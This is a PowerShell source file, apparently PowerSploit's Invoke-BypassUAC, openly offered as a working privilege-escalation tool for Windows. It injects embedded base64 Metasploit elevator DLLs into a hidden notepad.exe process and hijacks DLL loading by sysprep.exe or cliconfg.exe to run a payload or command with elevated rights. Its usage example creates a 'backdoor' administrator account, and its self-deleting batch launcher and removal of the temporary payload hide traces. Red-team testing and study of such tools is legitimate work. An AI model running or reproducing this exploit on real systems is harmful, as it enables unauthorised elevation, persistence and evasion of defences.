function Invoke-BypassUAC
{
    <#
    .SYNOPSIS

    Performs the bypass UAC attack by utilizing the trusted publisher 
    certificate through process injection. 

    PowerSploit Function: Invoke-BypassUAC
    Author: @sixdub, @harmj0y, @mattifestation, @meatballs__, @TheColonial
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    If a payload .dll is used, please set it to use ExitProcess. If a command is 
    specified, a self-deleting launcher.bat will be created that executes a given 
    command in an elevated context. This version should work on both Windows 7 and
    Windows 8/8.1.

    The BypassUAC attack was originally published by Leo Davidson.
    See http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html 
    for more technical details.

    This work is heavily based on PowerSploit's Invoke--Shellcode.ps1 script from 
    Matthew Graeber (@mattifestation).

    It also utlizes the elevator .dll from the Metasploit project from 
    Ben Campbell (@meatballs__) and OJ Reeves (@TheColonial).

    .PARAMETER PayloadPath

    The path of the .dll payload you want to run in an elevated context.

    .PARAMETER Command

    Command to run in an elevated context if a custom .dll isn't specified.

    .PARAMETER PatchExitThread

    Use this switch if you would like the script to automatically patch the "ExitThread" bytes 
    to "ExitProcess". This ensures the target hijack process exits cleanly and does not cause 
    a popup. This technique should be used for Metasploit payloads and any payload that does 
    not properly shut down the process on its' own. 

    .EXAMPLE

    PS C:\> Invoke-BypassUAC -Command 'net user backdoor "Password123!" /add && net localgroup administrators backdoor /add"' -Verbose
    
    Create a local user 'backdoor' and add it to the local administrators group.

    .EXAMPLE

    Invoke-BypassUAC -PayloadPath .\payload.dll -Verbose

    Run a custom .dll payload in an elevated context.

    .LINK
    https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke--Shellcode.ps1
    https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/bypassuac_injection.rb
    https://github.com/rapid7/metasploit-framework/tree/master/external/source/exploits/bypassuac_injection/dll/src
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)]
        [string]
        $PayloadPath,

        [Parameter(Mandatory = $False)]
        [string]
        $Command,

        [Parameter(Mandatory = $False)]
        [switch]
        $PatchExitThread=$false
    )

    Set-StrictMode -Version 2.0

    # checks to ensure it's appropriate to run BypassUAC
    if(($(whoami /groups) -like "*S-1-5-32-544*").length -eq 0) {
        "[!] Current user not a local administrator!"
        Throw ("Current user not a local administrator!")
    }
    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
        "[!] Not in a medium integrity process!"
        Throw ("Not in a medium integrity process!")
    }

    function Local:Invoke-PatchDll {
        <#
        .SYNOPSIS
        Patches a string in a binary byte array.

        .PARAMETER DllBytes
        Binary blog to patch.

        .PARAMETER FindString
        String to search for to replace.

        .PARAMETER ReplaceString
        String to replace FindString with
        #>

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [string]
            $FindString,

            [Parameter(Mandatory = $True)]
            [string]
            $ReplaceString
        )

        $FindStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($FindString)
        $ReplaceStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($ReplaceString)

        $index = 0
        $s = [System.Text.Encoding]::ASCII.GetString($DllBytes)
        $index = $s.IndexOf($FindString)

        if($index -eq -1)
        {
            throw("Could not find string $FindString !")
        }
        Write-Verbose "Pattern $FindString found at $index"

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
        {
            $DllBytes[$index+$i]=$ReplaceStringBytes[$i]
        }

        return $DllBytes
    }


    function Local:Write-HijackDll {
        <#
        .SYNOPSIS
        Writes out a hijackable .dll that launches a 'debug.bat' file in the 
        same location as the .dll.

        .PARAMETER OutputFile
        File name to write the .dll to.

        .PARAMETER BatchPath
        Patch to the .bat for the .dll to launch. Defaults to "debug.bat" in the
        .dll's current directory.

        .PARAMETER Arch
        Architeture of .dll to generate, x86 or x64. If not the architecture is not
        explicitly specified, the code will try to automatically determine what's
        appropriate.

        Author: @harmj0y
        License: BSD 3-Clause
        #>

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [string]
            $OutputFile,

            [string]
            $BatchPath,        

            [string]
            $Arch
        )

        # generate with base64 -w 0 hijack32.dll > hijack32.b64
        $DllBytes32 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACOEK/uynHBvcpxwb3KccG90exqvehxwb3R7F+923HBvdHsa72QccG9wwlSvclxwb3KccC9hXHBvdHsbr3JccG90exavctxwb3R7Fy9y3HBvVJpY2jKccG9AAAAAAAAAABQRQAATAEFAMOklVUAAAAAAAAAAOAAAiELAQoAAJAAAABaAAAAAAAAliEAAAAQAAAAoAAAAAAAEAAQAAAAAgAABQABAAAAAAAFAAEAAAAAAABAAQAABAAAuVkBAAIAQAEAABAAABAAAAAAEAAAEAAAAAAAABAAAADg0AAATAAAAKzKAAAoAAAAABABALQBA...(line truncated)...
        $DllBytes64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAB0sAUIMNFrWzDRa1sw0WtbK0zAWxPRa1srTMFbZtFrWytM9Vs60WtbOan4WzPRa1sw0WpbYdFrWytMxFsz0WtbK0zwWzHRa1srTPZbMdFrW1JpY2gw0WtbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGBgCqo5VVAAAAAAAAAADwACIgCwIKAACmAAAAagAAAAAAAHQiAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAEAAAQAANISAgACAEABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAA...(line truncated)...

        if($Arch) {
            if($Arch -eq "x64") {
                [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
            }
            elseif($Arch -eq "x86") {
                [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
            }
            else{
                Throw "Please specify x86 or x64 for the -Arch"
            }
        }
        else {
            # if no architecture if specified, try to auto-determine the arch
            if ($env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
                [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
                $Arch = "x64"
            }
            else {
                [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
                $Arch = "x86"
            }
        }

        # patch in the appropriate .bat launcher path if specified
        if ($BatchPath) {
            Write-Verbose "Patching dll with .bat path $BatchPath"
            $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString "debug.bat" -ReplaceString $BatchPath
        }

        Set-Content -value $DllBytes -encoding byte -path $OutputFile
    }

    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    Function Local:Invoke-CreateRemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
     
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
     
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
     
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
     
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
     
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
     
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Verbose "Error creating remote thread, thread handle is null"
        }
     
        return $RemoteThreadHandle
    }
    function Local:Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions |  Add-Member NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions |  Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions |  Add-Member NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions |  Add-Member NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions |  Add-Member NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
        $Win32Functions |  Add-Member NoteProperty -Name CloseHandle -Value $CloseHandle
        
        $GetLastErrorAddr = Get-ProcAddress kernel32.dll GetLastError
        $GetLastErrorDelegate = Get-DelegateType @() ([Uint32])
        $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)
        $Win32Functions |  Add-Member NoteProperty -Name GetLastError -Value $GetLastError
        
        $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        
        # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
        $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
        if ($IsWow64ProcessAddr)
        {
            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
            $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
            $Win32Functions |  Add-Member NoteProperty -Name IsWow64Process -Value $IsWow64Process
        }
        
        return $Win32Functions
        
    }
    function Local:Inject-BypassStuff ([Int] $ProcessID, $PEBytes32, $ReflectiveOffset_32,$PEBytes64,$ReflectiveOffset_64,$PathsBytes, $Win32Functions )
    {
        Write-Verbose "Injecting DLL into into PID: $ProcessId"

        # Open a handle to the process you want to inject into
        $hProcess = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
        write-verbose "Process Handle: $hProcess"
        if ($hProcess -eq 0)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }

        $IsWow64 = $false

        if ([System.IntPtr]::Size -eq 8) # Only perform theses checks if CPU is 64-bit
        {
            # Determine is the process specified is 32 or 64 bit
            $null = $Win32Functions.IsWow64Process.Invoke($hProcess, [Ref] $IsWow64)
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Unable to inject a 64-bit .dll from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) # 32-bit Wow64 process
            {
                [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit .dll'
                $ReflectiveOffset = $ReflectiveOffset_32
            }
            else # 64-bit process
            {
                [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
                Write-Verbose 'Using 64-bit .dll'
                $ReflectiveOffset = $ReflectiveOffset_64
            }
        }
        else # 32-bit CPU
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
            Write-Verbose 'Using 32-bit .dll'
            $ReflectiveOffset = $ReflectiveOffset_32
        }

        ##########################################
        # INJECT THE PATHS INTO THE REMOTE PROCESS AND GET AN ADDRESS
        $PathsBytesSize = $PathsBytes.Length + (1024 - ($PathsBytes.Length % 1024))
        Write-Verbose "PathsBytesSize: $PathsBytesSize"

        # allocate space and copy in the paths struct
        $RemotePathsAddr = $Win32Functions.VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $PathsBytesSize, 0x3000, 0x40)
        Write-Verbose "Paths memory reserved at 0x$($RemotePathsAddr.ToString("X$([IntPtr]::Size*2)"))"
        $null = $Win32Functions.WriteProcessMemory.Invoke($hProcess, $RemotePathsAddr, $PathsBytes, $PathsBytes.Length, [Ref] 0)
        
        #######################################
        # page-align the .dll we're injecting
        $RawBytesSize = $RawBytes.Length + (1024 - ($RawBytes.Length % 1024))
        Write-Verbose "RawBytesSize: $RawBytesSize"

        # Reserve and commit enough memory in remote process to hold the shellcode
        $RemoteMemAddr = $Win32Functions.VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $RawBytesSize, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate .dll memory in PID: $ProcessID"
        }

        Write-Verbose ".DLL memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
        # Copy .DLL into the previously allocated memory
        $null = $Win32Functions.WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $RawBytes, $RawBytes.Length, [Ref] 0)
        
        # Execute .dll as a remote thread, offset for the ReflectiveLoader function
        $RemoteMemAddrOffset = New-Object IntPtr ($RemoteMemAddr.ToInt64()+$ReflectiveOffset)
        Write-Verbose "RemoteMemAddr: $RemoteMemAddr"
        Write-Verbose "LoaderOffset: $ReflectiveOffset"
        Write-Verbose "LoaderMemAddr: $RemoteMemAddrOffset"
        
        $ThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $hProcess -StartAddress $RemoteMemAddrOffset -ArgumentPtr $RemotePathsAddr -Win32Functions $Win32Functions

        Write-Verbose "ThreadHandle: $ThreadHandle"
        $ErrorString = "LastError: " + $Win32Functions.GetLastError.Invoke()
        Write-Verbose $ErrorString

        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProcessID"
        }

        Start-Sleep -s 10

        Write-Verbose '.DLL injection complete!'
    }
    
    $Win32Functions = Get-Win32Functions
    if (Get-ProcAddress kernel32.dll IsWow64Process)
    {
        $64bitCPU = $true
    }
    else
    {
        $64bitCPU = $false
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    # the elevator .dll's from the Metasploit project
    #   https://github.com/rapid7/metasploit-framework/tree/master/data/post
    #   thanks @meatballs__ and @TheColonial !
    $Bytes64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABKedZzDhi4IA4YuCAOGLggSElZIBYYuCBISVggbhi4IEhJZyAGGLgg0+dzIAkYuCAOGLkgWxi4IANKWSANGLggA0pkIA8YuCADSmMgDxi4IANKZiAPGLggUmljaA4YuCAAAAAAAAAAAFBFAABkhgYAXBauVAAAAAAAAAAA8AAiIAsCDAAAtAAAALIAAAAAAABMGwAAABAAAAAAAIABAAAAABAAAAACAAAGAAAAAAAAAAYAAAAAAAAAALABAAAEAAAAAAAAAgBgAQAAEAAAAAAAABAAAAAAAAAAABAAAAAAAAAQAAAAAAAAAAAAABAAAADgLAEA...(line truncated)...
    $Bytes32 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACFZANQwQVtA8EFbQPBBW0Dh1SMA9kFbQOHVLIDzgVtA4dUjQOkBW0DHPqmA8YFbQPBBWwDkwVtA8xXjAPABW0DzFeNA8MFbQPMV7EDwAVtA8xXtgPABW0DzFezA8AFbQNSaWNowQVtAwAAAAAAAAAAUEUAAEwBBQBaFq5UAAAAAAAAAADgAAIhCwEMAACoAAAAigAAAAAAAMIYAAAAEAAAAMAAAAAAABAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAYAEAAAQAAAAAAAACAEABAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAUAEBAFgAAACoAQEA...(line truncated)...

    $ReflectiveOffset_32 = 1600
    $ReflectiveOffset_64 = 1680
    
    # generate a hijackable .dll with the specified command if a custom
    #   payload .dll path isn't specified
    if ($PayloadPath -eq ""){
        
        if ($Command -eq "") {
            throw "Either PayloadPath or Command must be specified."
        }

        $TempPayloadPath = $env:Temp + "\CRYPTBASE.dll"
        $BatchPath = $env:Temp + "\debug.bat"

        # build the launcher .bat
        "@echo off\n" | Out-File -Encoding ASCII -Append $BatchPath 
        "start /b $Command" | Out-File -Encoding ASCII -Append $BatchPath 
        'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $BatchPath

        Write-HijackDll -OutputFile $TempPayloadPath -BatchPath $BatchPath
        Write-Verbose "Hijackable .dll written to $TempPayloadPath"
        Write-Verbose ".bat launcher written to $BatchPath"
    }
    else {
        $TempPayloadPath = $env:Temp + "\CRYPTBASE.dll"

        #decide if we need to patch the payload to force it to exit process
        #so no pop-ups get presented to the user
        if($PatchExitThread)
        {
            Write-Verbose "Patching ExitThread to ExitProcess..."

            [Byte[]]$Payload = Get-Content -Encoding Byte $PayloadPath

            $Payload = Invoke-PatchDll -DllBytes $Payload -FindString "ExitThread" -ReplaceString "ExitProcess"

            Write-Verbose "Replaced ExitThread with ExitProcess..."
            [io.file]::WriteAllBytes($TempPayloadPath,$Payload)

            Write-Verbose "Patched DLL written out to $TempPayloadPath"   
        }

        else {
            # copy the payload to the proper temp path
            Copy-Item $PayloadPath $TempPayloadPath
            Write-Verbose "payload .dll copied to $TempPayloadPath"
        }
    }


    $OSVersion = ([Environment]::OSVersion.Version | %{"$($_.Major).$($_.Minor)"})

    if (($OSVersion -eq "6.0") -or ($OSVersion -eq "6.1")) {
        # windows 7/2008
        $szElevDll = 'CRYPTBASE.dll'
        $szElevDir = $env:WINDIR + "\System32\sysprep"
        $szElevDirSysWow64 = $env:WINDIR + "\sysnative\sysprep"
        $szElevExeFull = "$szElevDir\sysprep.exe"
        $szElevDllFull = "$szElevDir\$szElevDll"
        $szTempDllPath = $TempPayloadPath
        Write-Verbose "Windows 7/2008 detected"
    }
    elseif (($OSVersion -eq "6.2") -or ($OSVersion -eq "6.3") -or ($OSVersion -eq "10.0")) {
        # windows 8/2012
        $szElevDll = 'NTWDBLIB.dll'
        $szElevDir = $env:WINDIR + "\System32"
        $szElevDirSysWow64 = ''
        $szElevExeFull = "$szElevDir\cliconfg.exe"
        $szElevDllFull = "$szElevDir\$szElevDll"
        $szTempDllPath = $TempPayloadPath
        Write-Verbose "Windows 8/2012 detected"
    }
    else {
        "[!] Unsupported OS!"
        throw("Unsupported OS!")
    }
    
    write-verbose "Elevation DLL: $szElevDll"
    write-verbose "Elevation Dir: $szElevDir"
    write-verbose "Elevation DirSysWow64: $szElevDirSysWow64"
    write-verbose "Elevation ExeFull: $szElevExeFull"
    write-verbose "Elevation DllFull: $szElevDllFull"
    write-verbose "Temp DLL: $szTempDllPath"    

    $PathsBytes = new-object byte[] $(520 * 6)
    # convert all the strings to unicode and patch each to 520 bytes
    $temp = [System.Text.Encoding]::UNICODE.GetBytes($szElevDir)
    for ($i = 0; $i -lt $temp.length; $i++) {
        $PathsBytes[$i+(520*0)] = $temp[$i];
    }
    $temp = [System.Text.Encoding]::UNICODE.GetBytes($szElevDirSysWow64)
    for ($i = 0; $i -lt $temp.length; $i++) {
        $PathsBytes[$i+(520*1)] = $temp[$i];
    }
    $temp = [System.Text.Encoding]::UNICODE.GetBytes($szElevDll)
    for ($i = 0; $i -lt $temp.length; $i++) {
        $PathsBytes[$i+(520*2)] = $temp[$i];
    }
    $temp = [System.Text.Encoding]::UNICODE.GetBytes($szElevDllFull)
    for ($i = 0; $i -lt $temp.length; $i++) {
        $PathsBytes[$i+(520*3)] = $temp[$i];
    }
    $temp = [System.Text.Encoding]::UNICODE.GetBytes($szElevExeFull)
    for ($i = 0; $i -lt $temp.length; $i++) {
        $PathsBytes[$i+(520*4)] = $temp[$i];
    }
    $temp = [System.Text.Encoding]::UNICODE.GetBytes($szTempDllPath)
    for ($i = 0; $i -lt $temp.length; $i++) {
        $PathsBytes[$i+(520*5)] = $temp[$i];
    }

    Write-Verbose "Spawning new hidden notepad.exe process in the background"
    $proc = Start-Process -WindowStyle Hidden notepad.exe -PassThru
    Inject-BypassStuff $proc.ID $Bytes32 $ReflectiveOffset_32 $Bytes64 $ReflectiveOffset_64 $PathsBytes $Win32Functions

    Write-Verbose "Removing temporary payload $TempPayloadPath"
    Remove-Item -Path $TempPayloadPath -Force
}
